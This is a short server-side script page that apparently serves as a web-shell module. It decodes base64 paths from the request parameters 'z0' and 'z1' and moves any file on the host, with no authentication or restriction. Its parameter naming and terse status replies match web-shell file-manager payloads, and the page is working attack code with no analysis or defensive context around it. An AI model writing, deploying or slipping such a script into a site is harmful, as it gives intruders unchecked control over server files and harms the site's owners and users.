<%
(function() {
    response.setContentType("text/html");
    response.setCharacterEncoding("UTF-8");

    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;
    var StandardCopyOption = java.nio.file.StandardCopyOption;

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    var src_path = base64_decode(request.getParameter("z0"));
    var dst_path = base64_decode(request.getParameter("z1"));

    if (!src_path || !dst_path) {
        output("0|Missing parameters.");
        return;
    }

    try {
        var src = Paths.get(src_path);
        var dest = Paths.get(dst_path);

        if (!Files.exists(src)) {
            output('0|Source does not exist.');
            return;
        }

        if (!Files.exists(dest)) {
            Files.move(src, dest, StandardCopyOption.ATOMIC_MOVE);
            output('1|');
        } else {
            output('0|Destination already exists.');
        }
    } catch (e) {
        output('0|Error.');
    }
})();
%>